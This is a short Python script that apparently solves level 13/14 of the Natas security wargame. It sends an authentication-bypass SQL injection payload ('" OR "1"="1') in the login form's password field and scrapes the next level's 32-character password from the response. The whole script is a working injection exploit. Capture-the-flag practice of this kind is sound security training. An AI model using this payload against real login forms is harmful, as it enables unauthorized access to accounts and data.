import config
import os, re
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

response = post(url, auth=(user, password), data={"username" : "natas14", "password" : "test\" OR \"1\"=\"1"})
password = re.findall(r"\w{32}", response.content)[-1]

print(password)
